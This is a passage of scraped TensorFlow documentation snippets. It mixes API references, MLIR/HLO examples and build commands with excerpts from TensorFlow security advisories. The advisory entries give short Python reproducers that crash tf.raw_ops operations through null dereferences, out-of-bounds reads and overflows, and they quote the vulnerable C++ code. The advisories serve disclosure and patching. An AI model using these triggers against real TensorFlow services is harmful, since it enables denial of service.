  depth_multiplier:int;
  fused_activation_function:ActivationFunctionType;
}
```

----------------------------------------

TITLE: Add Vocab File to Bert Tokenizer Options Python
DESCRIPTION: This function adds the specified vocabulary file string offset to the `BertTokenizerOptions` table being built using a FlatBuffers builder. It's typically called after serializing the vocabulary file content as a string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsAddVocabFile.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BertTokenizerOptionsAddVocabFile(
    builder, vocabFile
)
```

----------------------------------------

TITLE: Creating a basic HLO module without aliasing (MLIR)
DESCRIPTION: Defines a simple HLO module named 'increment' in MLIR. It takes a single floating-point scalar parameter, adds a constant value of 1 to it, and produces a scalar output. This basic definition implies the allocation of separate buffers for input and output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/aliasing.md#_snippet_0

LANGUAGE: mlir
CODE:
```
HloModule increment

ENTRY entry {
  %p = f32[] parameter(0)
  %c = f32[] constant(1)
  ROOT %out = f32[] add(%p, %c)
}
```

----------------------------------------

TITLE: Processing Einsum Labels and Ellipsis Flags C++
DESCRIPTION: This C++ code snippet from `EinsumHelper::ParseEquation` demonstrates the vulnerable logic. It iterates through input and output labels, incrementing counts or setting the corresponding ellipsis flag to `true` if an ellipsis is found. The issue is that the ellipsis flags are never explicitly set to `false` if no ellipsis is present, leading to potential uninitialized access or reliance on prior state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-192.md#_snippet_0

LANGUAGE: C++
CODE:
```
for (int i = 0; i < num_inputs; ++i) {
  input_label_counts->at(i).resize(num_labels);
  for (const int label : input_labels->at(i)) {
    if (label != kEllipsisLabel)
      input_label_counts->at(i)[label] += 1;
    else
      input_has_ellipsis->at(i) = true;
  }
}
output_label_counts->resize(num_labels);
for (const int label : *output_labels) {
  if (label != kEllipsisLabel)
    output_label_counts->at(label) += 1;
  else
    *output_has_ellipsis = true;
}
```

----------------------------------------

TITLE: Accessing SentencePiece Model Data Python
DESCRIPTION: This instance method provides access to the SentencePiece model data. It likely takes an index `j` if the model data is represented as a vector or array within the flatbuffer structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_3

LANGUAGE: python
CODE:
```
SentencePieceModel(
    j
)
```

----------------------------------------

TITLE: Reproducing Null Pointer Vulnerability in TensorFlow Python
DESCRIPTION: This Python script demonstrates how to trigger the null pointer dereference vulnerability in TensorFlow's `MatrixDiagV2` (or V3) operation. It creates empty `float32` tensors for the `diagonal` and `padding_value` arguments and calls the raw op with zero dimensions. This exposes the lack of empty tensor validation in the underlying C++ kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-004.md#_snippet_1

LANGUAGE: Python
CODE:
```
import tensorflow as tf

d = tf.convert_to_tensor([],dtype=tf.float32)
p = tf.convert_to_tensor([],dtype=tf.float32)
tf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)
```

----------------------------------------

TITLE: Triggering ReverseSequence OOB Read - TensorFlow Python
DESCRIPTION: This Python snippet shows how to call the vulnerable `tf.raw_ops.ReverseSequence` operation with negative `batch_dim` and `seq_dim` values that are too large (negative) to trigger the heap out-of-bounds read vulnerability during shape inference. It defines a `@tf.function` to wrap the call.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-002.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ReverseSequence(
    input = ['aaa','bbb'],
    seq_lengths = [1,1,1],
    seq_dim = -10,
    batch_dim = -10 )
  return y

test()
```

----------------------------------------

TITLE: Triggering Dequantize Integer Overflow using TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates the integer overflow vulnerability in TensorFlow's `tf.raw_ops.Dequantize` operation. It sets the `axis` parameter to a large value (`2**31-1`) to trigger the overflow when the C++ code attempts to calculate `axis + 1` for shape inference. It defines a simple input tensor and wraps the operation in a `tf.function`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-004.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

input = tf.constant([1,1],dtype=tf.qint32)

@tf.function
def test():
  y = tf.raw_ops.Dequantize(
    input=input,
    min_range=[1.0],
    max_range=[10.0],
    mode='MIN_COMBINED',
    narrow_range=False,
    axis=2**31-1,
    dtype=tf.bfloat16)
  return y

test()
```

----------------------------------------

TITLE: TensorFlow C API: Assigning DLPack Tensor Shape and Strides C++
DESCRIPTION: This C++ snippet, following the previous operations, assigns the shape and strides pointers of a DLPack tensor. The text indicates that if the preceding function calls (`TFE_TensorHandleDevicePointer`, `GetDlDataType`) failed but their status was not checked, internal variables (`shape_arr`, `stride_arr`) might be null, causing these assignments to attempt dereferencing null pointers, resulting in undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-025.md#_snippet_1

LANGUAGE: C++
CODE:
```
dlm_tensor->dl_tensor.shape = &(*shape_arr)[0];
  dlm_tensor->dl_tensor.strides = &(*stride_arr)[0];
```

----------------------------------------

TITLE: Building and Uploading Python Package to TestPyPI
DESCRIPTION: These commands outline the steps to build a source distribution (sdist) of a Python package and upload it to the Test PyPI repository using `twine`. It includes modifying the package configuration, installing necessary tools, building the distribution, uploading it, and finally installing the package from Test PyPI.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/redundant_tensorflow_gpu/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
$ vim setup.cfg  # update the version number and package name
$ python3 -m pip install --user twine
$ python3 setup.py sdist
$ twine upload --repository testpypi dist/*
$ pip3 install the_name_of_your_test_package -i https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple
```

----------------------------------------

TITLE: TensorFlow Legacy TensorShape Constructor - C++
DESCRIPTION: This C++ snippet shows the legacy `TensorShapeBase` constructor used in the vulnerable code path. It initializes the shape and then calls `InitDims`, wrapping the call in `TF_CHECK_OK`. If `InitDims` returns a non-OK status (e.g., due to overflow), this `CHECK` triggers a program termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-024.md#_snippet_1

LANGUAGE: c++
CODE:
```
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

----------------------------------------

TITLE: Break Statement in For Loop Input Example Python
DESCRIPTION: Original Python code demonstrating a `for` loop with a `break` statement, used as an example for AutoGraph transformation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_29

LANGUAGE: Python
CODE:
```
for i in range(10):
  if i > 3:
    break
```

----------------------------------------

TITLE: Demonstrating TensorFlow UpSampling2D Overflow in Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in TensorFlow's image resizing logic. It uses `tf.keras.layers.UpSampling2D` with an intentionally large `size` parameter (1610637938). This size causes the calculation of the output tensor's element count to overflow the `int64_t` type, triggering a `CHECK` failure and aborting the TensorFlow process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-195.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.keras.layers.UpSampling2D(
  size=1610637938,
  data_format='channels_first',
  interpolation='bilinear')(np.ones((5,1,1,1)))
```

----------------------------------------

TITLE: Example MLIR Before Simple Device Assignment (TF Dialect)
DESCRIPTION: Illustrates TensorFlow MLIR code containing `tf.Const` operations with varying `device` attribute states (missing, empty, or explicitly set). This serves as the input example for the simple device assignment pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_40

LANGUAGE: MLIR
CODE:
```
  %0 = "tf.Const"() {value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
  %1 = "tf.Const"() {device = "", value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
  %2 = "tf.Const"() {device = "baz", value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
```

----------------------------------------

TITLE: Get Padding Values from Explicit Attribute - Pseudo-code (C++)
DESCRIPTION: This helper function calculates explicit padding values for spatial dimensions based on an explicit pad attribute vector and TensorFlow data format. It iterates through spatial dimensions (typically H and W) and extracts the corresponding pad-before and pad-after values from the flattened explicit_pad vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_0

LANGUAGE: Pseudo-code (C++)
CODE:
```
vector<int64> get_padding_values_from_explicit_pad_attr(vector<int64> explicit_pad,
                                                         tensorflow::TensorFormat data_format_tf)
{
    int64 pad_before, pad_after;
    vector<int64> computed_paddings;

    for (int32 i = 0; i < 2; i++) {
        int64 dim = GetTensorSpatialDimIndex(4, data_format_tf, i);
        pad_before = explicit_pad[dim * 2];
        pad_after  = explicit_pad[dim * 2 + 1];
        computed_paddings.push_back(pad_before);
        computed_paddings.push_back(pad_after);
    }

    return computed_paddings;
}
```

----------------------------------------

TITLE: Lowering Split Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a split operation into a fixed number of slices along a specific axis using the TOSA dialect. It calculates the size of each slice based on the total dimension size and the number of splits. It then iterates through the splits, using the TOSA SLICE operation to extract each segment, and collects the results using TOSA IDENTITYN.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_24

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_split_op(Value %value, size_t axis, size_t num_split)
{
    Value %output[]

    size_t slice_size = %value.shape[axis] / num_split

    for (int32 i = 0; i < num_split; i++) {
        vector <size_t> begin_vals, size_vals

        for (int32 j = 0; j < %value.rank; j++) {
            if (j == axis) {
               begin_vals.push_back(slice_size * i)
               size_vals.push_back(slice_size)
            } else {
               begin_vals.push_back(0)
               size_vals.push_bac(%value.shape[j])
            }

            %output[i] = tosa.SLICE(%value) {start=begin_vals, size=size_vals}
        }

    }

    %output_list = tosa.IDENTITYN(%output)
    return %output_list
}
```

----------------------------------------

TITLE: Defining Saver Filename Placeholder - TensorFlow GraphDef
DESCRIPTION: This node defines a placeholder input for the graph, specifically intended to receive the filename string for saver operations (like saving or restoring). It expects a string data type and an empty shape, representing a scalar string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_4

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "saver_filename"
  op: "Placeholder"
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "dtype"
    value {
      type: DT_STRING
    }
  }
  attr {
    key: "shape"
    value {
      shape {
      }
    }
  }
}
```

----------------------------------------

TITLE: Getting Root As ModelMetadata (Deprecated Class Method)
DESCRIPTION: A deprecated class method to get the root object from a FlatBuffers buffer as a ModelMetadata instance. Use `GetRootAs` instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_6

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsModelMetadata(
    buf, offset=0
)
```

----------------------------------------

TITLE: Removing Unused WhileRegion Results in MLIR
DESCRIPTION: This pseudo-MLIR example demonstrates the `-tf-remove-unused-while-results` pass. It shows how an unused result of a `tf.WhileRegion` operation and its defining operation (`tf.OpB`) within the body are safely removed, resulting in a simplified operation with fewer results and arguments. The pass requires the result to be unused externally and the defining op to be safely removable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_36

LANGUAGE: MLIR
CODE:
```
  func.func @remove_first_result(%arg0, %arg1) {
    %0:2 = "tf.WhileRegion"(%arg0, %arg1) ({
    ^bb0(%arg2, %arg3):
      %1 = "tf.OpA"() {is_stateless = true}
      "tf.Yield"(%1)
    }, {
    ^bb0(%arg2, %arg3):
      %1 = "tf.OpB"(%arg2) {is_stateless = true}
      %2 = "tf.OpC"(%arg3) {is_stateless = true}
      "tf.Yield"(%1, %2)
    }) {is_stateless = true}
    return %0#1
  }
```

LANGUAGE: MLIR
CODE:
```
  func.func @remove_first_result(%arg0, %arg1) {
    %0 = "tf.WhileRegion"(%arg1) ({
    ^bb0(%arg3):
      %1 = "tf.OpA"() {is_stateless = true}
      "tf.Yield"(%1)
    }, {
    ^bb0(%arg3):
      %1 = "tf.OpC"(%arg3) {is_stateless = true}
      "tf.Yield"(%1)
    }) {is_stateless = true}
    return %0
  }
```

----------------------------------------

TITLE: Demonstrating Heap OOB Read in tf.ragged.cross Python
DESCRIPTION: This Python code snippet demonstrates how to trigger a heap out-of-bounds read vulnerability in TensorFlow's `tf.ragged.cross` operation using the lower-level `tf.raw_ops.RaggedCross`. It defines a TensorFlow function `test` that calls `RaggedCross` with specific empty or minimal inputs that expose the shape inference vulnerability. The code requires TensorFlow to be installed. It takes various parameters, including `ragged_values`, `ragged_row_splits`, `sparse_indices`, etc., with carefully chosen values to cause the OOB read during shape inference. The expected output is the result of the `RaggedCross` operation, potentially triggering the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-183.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.RaggedCross(ragged_values=[],
                             ragged_row_splits=[],
                             sparse_indices=[[5]],
                             sparse_values=[],
                             sparse_shape=[5],
                             dense_inputs=[['a']],
                             input_order='RD',
                             hashed_output=False,
                             num_buckets=5,
                             hash_key=2,
                             out_values_type=tf.string,
                             out_row_splits_type=tf.int64)
  return y

test()
```

----------------------------------------

TITLE: Defining and Registering XLA Custom Call on CPU using C++
DESCRIPTION: Demonstrates how to define an XLA HLO `CustomCall` instruction using `xla::XlaBuilder`, implement the custom logic in a C++ function `do_custom_call`, define its FFI signature using `XLA_FFI_DEFINE_HANDLER`, and register the handler with the XLA FFI on the "Host" platform. The example computes `A[i] = B[i % 128] + C[i]` for F32 arrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_15

LANGUAGE: C++
CODE:
```
#include "xla/client/xla_builder.h"
#include "xla/service/custom_call_target_registry.h"

void do_it() {
  xla::XlaBuilder b("do_it");
  xla::XlaOp param0 =
      xla::Parameter(&b, 0, xla::ShapeUtil::MakeShape(xla::F32, {128}), "p0");
  xla::XlaOp param1 =
      xla::Parameter(&b, 1, xla::ShapeUtil::MakeShape(xla::F32, {2048}), "p1");
  xla::XlaOp custom_call =
      xla::CustomCall(&b, "do_custom_call", /*operands=*/{param0, param1},
        /*shape=*/xla::ShapeUtil::MakeShape(xla::F32, {2048}),
        /*opaque=*/"", /*has_side_effect=*/false,
        /*output_operand_aliasing=*/{}, /*literal=*/nullptr,
        /*schedule=*/CustomCallSchedule::SCHEDULE_NONE,
        /*api_version=*/CustomCallApiVersion::API_VERSION_TYPED_FFI);
}

// Constrain custom call arguments to 1-dimensional buffers of F32 data type.
using BufferF32 = xla::ffi::BufferR1<xla::ffi::DataType::F32>;

// Implement a custom call as a C+ function. Note that we can use `Buffer` type
// defined by XLA FFI that gives us access to buffer data type and shape.
xla::ffi::Error do_custom_call(BufferF32 in0, BufferF32 in1,
                               xla::ffi::Result<BufferF32> out) {
  size_t d0 = in0.dimensions[0];
  size_t d1 = in1.dimensions[0];

  // Check that dimensions are compatible.
  assert(out->dimensions[0] == d1 && "unexpected dimensions");

  for (size_t i = 0; i < d1; ++i) {
    out->data[i] = in0.data[i % d0] + in1.data[i];
  }
}

// Explicitly define an XLA FFI handler signature and bind it to the
// `do_custom_call` implementation. XLA FFI handler can automatically infer
// type signature from the custom call function, but it relies on magical
// template metaprogramming an explicit binding provides and extra level of
// type checking and clearly states custom call author intentions.
XLA_FFI_DEFINE_HANDLER(handler, do_custom_call,
                       ffi::Ffi::Bind()
                           .Arg<Buffer>()
                           .Arg<Buffer>()
                           .Ret<Buffer>());

// Registers `handler` with and XLA FFI on a "Host" platform.
XLA_FFI_REGISTER_HANDLER(xla::ffi::GetXlaFfiApi(), "do_custom_call",
                         "Host", handler);
```

----------------------------------------

TITLE: Configuring MLIR-HLO Build with CMake - Bash
DESCRIPTION: Creates a build directory, navigates into it, and runs CMake to configure the MLIR-HLO project. It specifies the build system (Ninja), build type (Release with assertions), and points to the built MLIR dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/README.md#_snippet_3

LANGUAGE: Bash
CODE:
```
mkdir build && cd build
cmake .. -GNinja \
   -DLLVM_ENABLE_LLD=ON \
   -DCMAKE_BUILD_TYPE=Release \
   -DLLVM_ENABLE_ASSERTIONS=On \
   -DMLIR_DIR=${PWD}/../llvm-build/lib/cmake/mlir
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference in TensorFlow CTCLoss (Python)
DESCRIPTION: This Python snippet illustrates how providing empty tensors for inputs and labels while providing potentially problematic sequence lengths can trigger a null pointer dereference vulnerability in `tf.raw_ops.CTCLoss`. It highlights the lack of validation when certain input tensors are empty, leading to the flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-101.md#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)
labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
labels_values = tf.constant([], shape=[0], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

----------------------------------------

TITLE: Demonstrating QuantizedMaxPool Null Pointer Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to call the TensorFlow `tf.raw_ops.QuantizedMaxPool` operation with specific input parameters that could trigger the null pointer reference vulnerability. It shows the use of `quint8` data type and specific values for `min_input` and `max_input` which, in affected versions, lead to the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-018.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QuantizedMaxPool(
    input = tf.constant([[[[4]]]], dtype=tf.quint8),
    min_input = [],
    max_input = [1],
    ksize = [1, 1, 1, 1],
    strides = [1, 1, 1, 1],
    padding = "SAME", name=None
)
```

----------------------------------------

TITLE: Vulnerable Division Calculation in QuantizedAddUsingEigen (C++)
DESCRIPTION: This C++ snippet from the Eigen kernel implementation `QuantizedAddUsingEigen` shows the calculation `input_element_count / smaller_input_element_count`. The vulnerability described in TFSA-2021-034 arises here when `smaller_input_element_count` is zero (e.g., from an empty tensor input), leading to an integer division by zero undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-034.md#_snippet_1

LANGUAGE: c++
CODE:
```
template <typename T1, typename T2, typename T3>
void QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice& device,
                            const Tensor& input, float input_min,
                            float input_max, const Tensor& smaller_input,
                            float smaller_input_min, float smaller_input_max,
                            Tensor* output, float* output_min,
                            float* output_max) {
  ...
  const int64 input_element_count = input.NumElements();
  const int64 smaller_input_element_count = smaller_input.NumElements();
  ...
  bcast[0] = input_element_count / smaller_input_element_count;
  ...
}
```

----------------------------------------

TITLE: Demonstrating Overflow in TensorFlow sparse.eye (Python)
DESCRIPTION: This Python snippet demonstrates the overflow vulnerability in TensorFlow's `tf.sparse.eye` when attempting to create a large sparse identity matrix. The large value for `num_rows` triggers an underlying size calculation issue in the `tf.range` kernel, potentially leading to a crash or incorrect behavior in vulnerable versions of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-194.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.sparse.eye(num_rows=9223372036854775807, num_columns=None)
```

----------------------------------------

TITLE: Handling TensorFlow Type Constructor Result C++
DESCRIPTION: This C++ snippet from `graph.cc` shows code responsible for specializing a type based on node definition attributes. It calls `ValueOrDie()` on the result of `full_type::SpecializeType`. The vulnerability occurs here if `SpecializeType` returns an error status, as `ValueOrDie()` will cause a process crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-056.md#_snippet_0

LANGUAGE: C++
CODE:
```
  if (op_reg_data->type_ctor != nullptr) {
    VLOG(3) << "AddNode: found type constructor for " << node_def.name();
    const auto ctor_type =
        full_type::SpecializeType(AttrSlice(node_def), op_reg_data->op_def);
    const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();
    if (ctor_typedef.type_id() != TFT_UNSET) {
      *(node_def.mutable_experimental_type()) = ctor_typedef;
    }
  }
```

----------------------------------------

TITLE: Demonstrating SparseReshape Vulnerability - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the denial-of-service vulnerability (TFSA-2021-098) in `tf.raw_ops.SparseReshape` caused by incomplete validation. It provides intentionally crafted invalid input tensors (`input_shape` and `new_shape` tensors containing zeros) designed to trigger a `CHECK`-failure in vulnerable TensorFlow versions. This snippet requires the TensorFlow library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-098.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)
input_shape = tf.zeros([11], dtype=tf.int64)
new_shape = tf.zeros([1], dtype=tf.int64)

tf.raw_ops.SparseReshape(input_indices=input_indices,
    input_shape=input_shape,
    new_shape=new_shape)
```

----------------------------------------

TITLE: Vulnerable PNG Writing Function in TensorFlow C++
DESCRIPTION: This C++ code snippet shows the relevant part of the `png::WriteImageToBuffer` function in TensorFlow. It highlights the `CHECK_NOTNULL(image);` line, which is the assertion that fails when the `image` pointer is null (as is the case when an empty tensor is provided from Python), leading to the program's termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-020.md#_snippet_1

LANGUAGE: cpp
CODE:
```
template <typename T>
bool WriteImageToBuffer(
    const void* image, int width, int height, int row_bytes, int num_channels,
    int channel_bits, int compression, T* png_string,
    const std::vector<std::pair<std::string, std::string> >* metadata) {
  CHECK_NOTNULL(image);
  ...
}
```

----------------------------------------

TITLE: Triggering Crash in tf.strings.substr with Negative Position (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in TensorFlow's `tf.strings.substr`. Providing a negative value (-1) within the `pos` argument list causes a `CHECK`-fail internally, leading to a crash. This requires the TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-106.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.strings.substr(input='abc', len=1, pos=[1,-1])
```

----------------------------------------

TITLE: Triggering TensorSummaryV2 DoS Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to exploit a denial-of-service vulnerability in `tf.raw_ops.TensorSummaryV2`. It uses `numpy` and `tensorflow` to construct specific tensor inputs, notably providing a non-scalar (empty array) for `serialized_summary_metadata` encoded as base64, which triggers an internal check failure due to missing input validation when the C++ kernel attempts to treat it as a scalar.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-061.md#_snippet_0

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

tf.raw_ops.TensorSummaryV2(
  tag=np.array('test'),
  tensor=np.array(3),
  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))
```

----------------------------------------

TITLE: Reproducing TensorFlow DrawBoundingBoxes Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates a denial-of-service vulnerability in the `tf.raw_ops.DrawBoundingBoxes` operation. It attempts to call the function with image data of `tf.half` dtype and bounding box data of `tf.float32` dtype, which triggers a `CHECK` fail when the `boxes` input does not meet the expected dtype requirement, leading to a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-135.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)
arg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)
arg_2=''
tf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)
```

----------------------------------------

TITLE: Flawed Axis Validation Logic (C++)
DESCRIPTION: This C++ snippet shows the `OP_REQUIRES` macro used in the `QuantizeAndDequantizeV2` kernel implementation. The validation condition `(axis_ == -1 || axis_ < input.shape().dims())` is flawed because it allows negative values less than `-1` (like `-2`) to pass the check due to the `|| axis_ < input.shape().dims()` part when `input.shape().dims()` is 1 (as in the Python example).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-099.md#_snippet_1

LANGUAGE: c++
CODE:
```
OP_REQUIRES(ctx,
  (axis_ == -1 || axis_ < input.shape().dims()),
  errors::InvalidArgument(...));
```

----------------------------------------

TITLE: Triggering TensorListFromTensor Vulnerability in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability (CVE-2022-35992) in TensorFlow's `tf.raw_ops.TensorListFromTensor` operation. It initializes input tensors with specific shapes and data types, where the `element_shape` (`arg_1`) has a rank greater than one, which causes an assertion failure within the operation when executed. The snippet requires TensorFlow as a dependency and is expected to terminate the program due to the `CHECK` failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-128.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)
arg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)
arg_2=''
tf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)
```

----------------------------------------

TITLE: Configuring XLA for CUDA Backend Natively (Linux)
DESCRIPTION: Executes the XLA configuration script `./configure.py` directly on the host system, setting the build target backend to CUDA. This configures the native environment for GPU builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_9

LANGUAGE: shell
CODE:
```
./configure.py --backend=CUDA
```

----------------------------------------

TITLE: Adding FFTSG2D Library Target CMake
DESCRIPTION: Defines the static library target `fft2d_fftsg2d` using its source file. It links this target to the `fft2d_fftsg` library and sets the source directory as a private include path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_library(fft2d_fftsg2d "${FFT2D_SOURCE_DIR}/fftsg2d.c")
target_link_libraries(fft2d_fftsg2d fft2d_fftsg)
target_include_directories(fft2d_fftsg2d PRIVATE "${FFT2D_SOURCE_DIR}")
```

----------------------------------------

TITLE: Reproducing MaxPool3DGradGrad Null Pointer Dereference in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the null pointer dereference vulnerability in `tf.raw_ops.MaxPool3DGradGrad` by providing an empty gradient tensor. The operation fails to validate the input tensor's dimensions, leading to a crash when attempting to access elements of the empty tensor. It shows how to set up the input tensors and call the problematic function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-063.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.MaxPool3DGradGrad(
    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
    strides=strides, padding=padding)
```

----------------------------------------

TITLE: Handling Decode Error and Accessing State After Free (C++)
DESCRIPTION: This C++ snippet from the TensorFlow `DecodePng` kernel illustrates a use-after-free vulnerability. It shows how error handling code calls `png::CommonFreeDecode` to free memory, but subsequently accesses `decode.width` and `decode.height`, which reside in the freed memory region, leading to undefined behavior and the security flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-047.md#_snippet_0

LANGUAGE: C++
CODE:
```
if (/* ... error conditions ... */) {
  png::CommonFreeDecode(&decode);
  OP_REQUIRES(context, false,
              errors::InvalidArgument("PNG size too large for int: ",
                                      decode.width, " by ", decode.height));
}
```

----------------------------------------

TITLE: Bitcasting F32 Scalar to F16 Vector in XLA HLO
